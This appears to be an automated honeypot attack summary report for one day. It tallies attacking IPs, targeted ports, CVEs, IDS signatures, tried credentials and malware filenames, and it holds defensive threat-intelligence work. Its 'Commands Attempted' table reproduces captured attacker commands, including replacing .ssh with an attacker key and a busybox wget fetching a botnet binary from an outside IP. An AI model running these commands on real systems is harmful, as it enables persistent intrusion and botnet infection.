# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-03T20:11:47Z
**Timeframe:** 2025-10-03T04:02:10Z to 2025-10-03T20:01:46Z
**Files Used:**
- Honeypot_Attack_Summary_Report_2025-10-03T04:02:10Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T07:02:06Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T08:02:09Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T09:02:10Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T10:02:10Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T11:02:21Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T12:02:03Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T13:02:17Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T14:02:05Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T15:02:13Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T16:01:51Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T17:02:12Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T18:02:10Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T19:02:08Z.md
- Honeypot_Attack_Summary_Report_2025-10-03T20:01:46Z.md

## Executive Summary

This report provides a comprehensive analysis of attacks recorded by our honeypot network over the last 16 hours. A total of 212,236 malicious events were captured and analyzed. The most active honeypots were Cowrie, Ciscoasa, and Suricata, indicating a high volume of SSH/Telnet brute-force attempts and network-level attacks.

The majority of attacks originated from a small number of highly aggressive IP addresses, with a significant concentration on ports associated with email (25), VoIP (5060), SSH (22), and SMB (445). Attackers were observed attempting to exploit a wide range of vulnerabilities, including both recent and older CVEs, suggesting a broad and opportunistic approach.

A consistent pattern of post-exploitation activity was observed, with attackers attempting to establish persistent access by adding their SSH keys to the `authorized_keys` file. Additionally, there were numerous attempts to download and execute malicious scripts, including those associated with botnets and cryptocurrency miners. OSINT analysis of the top attacking IPs revealed that several are known malicious actors, while others are hosted on infrastructure with a history of abuse.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
- sens-ny | 10.108.0.2 | 161.35.180.163|

### Attacks by Honeypot

| Honeypot | Count |
|---|---|
| Cowrie | 81372 |
| Honeytrap | 18919 |
| Ciscoasa | 31057 |
| Suricata | 27752 |
| Sentrypeer | 11428 |
| Mailoney | 12903 |
| Dionaea | 11482 |
| Tanner | 518 |
| Adbhoney | 561 |
| H0neytr4p | 506 |
| ConPot | 269 |
| Redishoneypot | 340 |
| Honeyaml | 182 |
| Miniprint | 83 |
| ElasticPot | 74 |
| Dicompot | 75 |
| Ipphoney | 19 |
| Wordpot | 4 |
| ssh-ed25519 | 2 |
| Heralding | 6 |
| Medpot | 8 |

### Top Attacking IPs

| IP Address | Count |
|---|---|
| 45.234.176.18 | 14943 |
| 23.94.26.58 | 10638 |
| 176.65.141.117 | 8128 |
| 86.54.42.238 | 3235 |
| 23.175.48.211 | 4419 |
| 129.212.180.254 | 2277 |
| 89.254.211.131 | 2277 |
| 82.162.61.241 | 1468 |
| 187.23.140.222 | 1523 |
| 200.85.127.158 | 1382 |

### Top Targeted Ports/Protocols

| Port/Protocol | Count |
|---|---|
| 5060 | 11428 |
| 25 | 12903 |
| 22 | 9037 |
| 445 | 10325 |
| TCP/445 | 8609 |
| 80 | 664 |
| 443 | 487 |
| 23 | 585 |
| 6379 | 267 |
| 3306 | 232 |

### Most Common CVEs

| CVE |
|---|
| CVE-2002-0013 |
| CVE-2002-0012 |
| CVE-1999-0517 |
| CVE-2019-11500 |
| CVE-2021-3449 |
| CVE-2021-35394 |
| CVE-2023-26801 |
| CVE-2006-2369 |
| CVE-1999-0183 |
| CVE-2016-5696 |
| CVE-2018-10562 |
| CVE-2018-10561 |
| CVE-2024-4577 |
| CVE-2021-41773 |
| CVE-2021-42013 |
| CVE-2002-0953 |
| CVE-2020-2551 |
| CVE-2019-12263 |
| CVE-2019-12261 |
| CVE-2019-12260 |
| CVE-2019-12255 |
| CVE-2009-2765 |
| CVE-2019-16920 |
| CVE-2023-31983 |
| CVE-2020-10987 |
| CVE-2023-47565 |
| CVE-2015-2051 |
| CVE-2024-33112 |
| CVE-2022-37056 |
| CVE-2019-10891 |
| CVE-2014-6271 |
| CVE-2024-12856 |
| CVE-2024-12885 |
| CVE-2023-52163 |
| CVE-2024-10914 |
| CVE-2024-3721 |
| CVE-2006-3602 |
| CVE-2006-4458 |
| CVE-2006-4542 |
| CVE-2016-20016 |

### Commands Attempted by Attackers

| Command |
|---|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| `lockr -ia .ssh` |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` |
| `cat /proc/cpuinfo | grep name | wc -l` |
| `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'` |
| `uname -a` |
| `whoami` |
| `Enter new UNIX password:` |
| `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; ...` |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; ...` |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` |

### Signatures Triggered

| Signature |
|---|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication |
| ET DROP Dshield Block Listed Source group 1 |
| ET SCAN NMAP -sS window 1024 |
| ET SCAN Potential SSH Scan |
| ET INFO Reserved Internal IP Traffic |
| ET SCAN Sipsak SIP scan |
| ET DROP Spamhaus DROP Listed Traffic Inbound |
| ET CINS Active Threat Intelligence Poor Reputation IP |
| ET INFO curl User-Agent Outbound |
| ET HUNTING curl User-Agent to Dotted Quad |
| GPL SNMP request udp |
| ET SCAN MS Terminal Server Traffic on Non-standard Port |
| ET HUNTING RDP Authentication Bypass Attempt |
| ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source) |

### Users / Login Attempts

| Username/Password |
|---|
| 345gs5662d34/345gs5662d34 |
| root/3245gs5662d34 |
| root/nPSpP4PBW0 |
| test/zhbjETuyMffoL8F |
| foundry/foundry |
| superadmin/admin123 |
| root/LeitboGi0ro |
| root/2glehe5t24th1issZs |
| seekcy/Joysuch@Locate2021 |
| wangke/wangke |
| awx/awx123 |
| webuser/12345 |
| john/ |
| GET / HTTP/1.1/Host: ... |
| php/ |
| titu/Ahgf3487@rtjhskl854hd47893@#a4nC |
| gits/gits |
| ubnt/ubnt |

### Files Uploaded/Downloaded

| Filename |
|---|
| wget.sh; |
| w.sh; |
| c.sh; |
| arm.urbotnetisass |
| arm5.urbotnetisass |
| arm6.urbotnetisass |
| arm7.urbotnetisass |
| x86_32.urbotnetisass |
| mips.urbotnetisass |
| mipsel.urbotnetisass |
| boatnet.mpsl |
| 11 |
| fonts.gstatic.com |
| css?family=Libre+Franklin... |
| ie8.css?ver=1.0 |
| html5.js?ver=3.7.3 |
| rondo.dgx.sh |
| rondo.qre.sh |
| rondo.sbx.sh |
| rondo.tkg.sh |
| setup.sh |
| apply.cgi |
| catgirls; |
| sh |
| a |
| Help:Contents |
| Mozi.m |
| soap-envelope |
| addressing |
| discovery |
| devprof |
| soap:Envelope |
| gpon80&ipv=0 |
| k.php?a=x86_64,5LRF93W349Q42189H |
| nwfaiehg4ewijfgriehgirehaughrarg.mips |

## Google Searches

- Conducted OSINT on the following IP addresses: 45.234.176.18, 23.94.26.58, 129.212.180.254, 89.254.211.131, 82.162.61.241

## Key Observations and Anomalies

1.  **High-Volume, Coordinated Scans:** A massive number of events were generated by a few IP addresses, most notably `45.234.176.18` (associated with Google Cloud Platform) and `23.94.26.58` (HostPapa), which were flagged for port scanning. This suggests large-scale, automated scanning campaigns.

2.  **Persistent Access Attempts:** A recurring and prominent anomaly was the repeated attempt by attackers to add a specific SSH key with the comment "mdrfckr" to the `authorized_keys` file. This is a clear indication of a concerted effort to establish persistent, passwordless access to compromised systems.

3.  **Exploitation of Old and New Vulnerabilities:** The wide range of CVEs targeted highlights the fact that attackers are not just focusing on the latest vulnerabilities. The continued exploitation of older CVEs, such as CVE-2002-0013, suggests that many systems remain unpatched and vulnerable to well-known exploits.

4.  **Targeting of IoT and Network Devices:** The prevalence of attacks targeting various architectures (ARM, MIPS, x86) with malware like `urbotnetisass` and `Mozi.m` indicates a strong focus on compromising IoT devices and incorporating them into botnets.

5.  **DoublePulsar Resurgence:** The high number of "DoublePulsar Backdoor" signatures triggered, indicates that this malware, associated with the EternalBlue exploit, remains a significant threat. This suggests that many systems are still vulnerable to this well-known exploit.

6.  **"Rondo" Scripting Campaign:** Multiple variations of a script named "rondo" (`rondo.dgx.sh`, `rondo.qre.sh`, `rondo.sbx.sh`, `rondo.tkg.sh`) were observed being downloaded and executed. This suggests a coordinated campaign using a specific toolset to compromise systems.

7.  **Unusual Payloads:** The appearance of filenames like "catgirls;" is unusual and could be a signature or distraction tactic used by an attacker. The file `k.php?a=x86_64,5LRF93W349Q42189H` suggests a web-based attack vector, possibly a webshell or a file upload vulnerability being exploited.

This concludes the Honeypot Attack Summary Report. Continuous monitoring and analysis are recommended to track evolving threats and enhance our defensive posture.
